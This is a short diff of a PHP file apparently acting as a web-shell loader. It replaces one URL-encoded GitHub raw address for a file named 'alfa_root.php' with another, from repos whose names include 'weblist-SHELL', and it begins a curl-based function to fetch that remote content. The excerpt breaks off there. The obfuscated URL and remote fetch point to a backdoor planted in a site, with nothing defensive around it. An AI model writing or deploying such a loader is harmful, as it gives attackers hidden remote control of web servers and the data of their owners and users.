@@ -1,6 +1,6 @@
 <?php
 
-$decoded_url = rawurldecode(urldecode("https%3A%2F%2Fraw.githubusercontent.com%2Frendihidayat683%2Fweblist-SHELL%2Frefs%2Fheads%2Fmain%2Falfa_root.php"));
+$decoded_url = rawurldecode(urldecode("https%3A%2F%2Fraw.githubusercontent.com%2Funikbetpermata%2Fmain2%2Frefs%2Fheads%2Fmain%2Falfa_root.php"));
 
 function fetch_content($url) {
     if (function_exists('curl_init')) {
